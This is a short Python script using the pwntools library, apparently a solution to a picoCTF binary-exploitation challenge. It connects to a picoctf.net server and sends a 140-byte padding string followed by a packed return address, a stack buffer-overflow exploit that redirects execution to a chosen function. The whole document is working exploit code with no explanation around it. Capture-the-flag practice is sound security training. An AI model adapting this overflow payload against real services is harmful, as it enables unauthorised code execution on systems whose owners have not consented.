#!python3
from pwn import *
#connect saturn.picoctf.net 58905
p = remote('saturn.picoctf.net', 50199)
print(p.recvline())
p.sendline(b'a'*140+p32(0x00401530))
print(p.recvline())
print(p.recvline())
print(p.recvline())

p.close()